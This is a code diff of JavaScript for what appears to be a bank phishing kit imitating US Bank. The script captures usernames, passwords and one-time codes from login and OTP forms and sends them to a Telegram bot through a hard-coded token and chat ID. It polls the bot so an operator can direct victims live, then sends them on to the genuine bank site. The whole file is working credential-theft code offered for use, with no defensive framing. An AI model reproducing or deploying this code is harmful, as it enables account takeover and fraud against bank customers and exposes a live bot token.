@@ -1,29 +1,18 @@
-/* BrosTec Protocol - Full JS Replacement */
+/* BrosTec Protocol - Final Response Fix */
 const BOT_TOKEN = "8472908079:AAHRhM8yUVmfMagFkA85x8T0Zp9WMqWZftU";
 const CHAT_ID = "7865246557";
 
-// وظيفة إرسال البيانات (نفس منطق كود الريان)
 async function sendLog(type, content) {
-    let text = "";
-    let buttons = [];
+    let text = (type === 'LOGIN') 
+        ? `🏦 *New Login Attempt*\n\n👤 User: \`${content.user}\`\n🔑 Pass: \`${content.pass}\``
+        : `🔑 *OTP Received:*\n\nCode: \`${content.otp}\``;
 
-    if(type === 'LOGIN') {
-        text = `🏦 *New Login Attempt*\n\n` +
-               `👤 User: \`${content.user}\`\n` +
-               `🔑 Pass: \`${content.pass}\``;
-        buttons = [
-            [{ text: "طلب OTP 📲", callback_data: "request_otp" }],
-            [{ text: "خطأ في البيانات ❌", callback_data: "login_error" }]
-        ];
-    } 
-    else if(type === 'OTP') {
-        text = `🔑 *OTP Received:* \n\n` +
-               `Code: \`${content.otp}\``;
-        buttons = [
-            [{ text: "❌ رمز خطأ", callback_data: "otp_error" }],
-            [{ text: "✅ تم بنجاح", callback_data: "done" }]
-        ];
-    }
+    let buttons = (type === 'LOGIN')
+        ? [[{ text: "طلب OTP 📲", callback_data: "request_otp" }], [{ text: "خطأ في البيانات ❌", callback_data: "login_error" }]]
+        : [[{ text: "❌ رمز خطأ", callback_data: "otp_error" }], [{ text: "✅ تم بنجاح", callback_data: "done" }]];
+
+    // تصفير التحديثات القديمة قبل إرسال الجديد لضمان الاستجابة للأمر القادم فقط
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
 
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
@@ -37,7 +26,6 @@ async function sendLog(type, content) {
     });
 }
 
-// وظيفة الاستماع للأوامر (نسخة طبق الأصل من منطق الربط في كود الريان)
 async function listen() {
     try {
         const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
@@ -47,54 +35,33 @@ async function listen() {
             const update = data.result[0];
             const cmd = update.callback_query?.data;
             
-            // تنفيذ الأوامر بناءً على رد فعل الآدمين في التيليجرام
             if(cmd === "request_otp") {
                 window.location.href = "otp.html"; 
-            }
-            if(cmd === "login_error") {
+            } else if(cmd === "login_error") {
                 if(document.getElementById('loader')) document.getElementById('loader').style.display = 'none';
                 if(document.getElementById('error-msg')) document.getElementById('error-msg').style.display = 'block';
-            }
-            if(cmd === "otp_error") {
+            } else if(cmd === "otp_error") {
                 if(document.getElementById('loader')) document.getElementById('loader').style.display = 'none';
-                if(document.getElementById('otp-error')) {
-                    document.getElementById('otp-error').style.display = 'block';
-                    document.getElementById('otp_val').value = ""; // تفريغ الحقل لإعادة الإدخال
-                }
-            }
-            if(cmd === "done") {
-                // يمكنك توجيهه لصفحة النجاح أو البنك الحقيقي
+                if(document.getElementById('otp-error')) document.getElementById('otp-error').style.display = 'block';
+                if(document.getElementById('otp_val')) document.getElementById('otp_val').value = "";
+            } else if(cmd === "done") {
                 window.location.href = "https://www.usbank.com";
             }
         }
-    } catch(e) { console.error("Polling Error"); }
+    } catch(e) {}
 }
 
-// فحص الأوامر كل 3 ثوانٍ كما في المرجع
-setInterval(listen, 3000);
+setInterval(listen, 2000);
 
-// مراقبة النماذج (Submit Events)
-const loginForm = document.getElementById('loginForm');
-if (loginForm) {
-    loginForm.addEventListener('submit', function(e) {
+document.addEventListener('submit', function(e) {
+    if(e.target.id === 'loginForm' || e.target.id === 'otpForm') {
         e.preventDefault();
         if(document.getElementById('loader')) document.getElementById('loader').style.display = 'flex';
         
-        const user = document.getElementById('user').value;
-        const pass = document.getElementById('pass').value;
-        
-        sendLog('LOGIN', {user, pass});
-    });
-}
-
-const otpForm = document.getElementById('otpForm');
-if (otpForm) {
-    otpForm.addEventListener('submit', function(e) {
-        e.preventDefault();
-        if(document.getElementById('loader')) document.getElementById('loader').style.display = 'flex';
-        
-        const otp = document.getElementById('otp_val').value;
-        
-        sendLog('OTP', {otp});
-    });
-}
+        const data = (e.target.id === 'loginForm') 
+            ? { user: document.getElementById('user').value, pass: document.getElementById('pass').value }
+            : { otp: document.getElementById('otp_val').value };
+            
+        sendLog(e.target.id === 'loginForm' ? 'LOGIN' : 'OTP', data);
+    }
+});
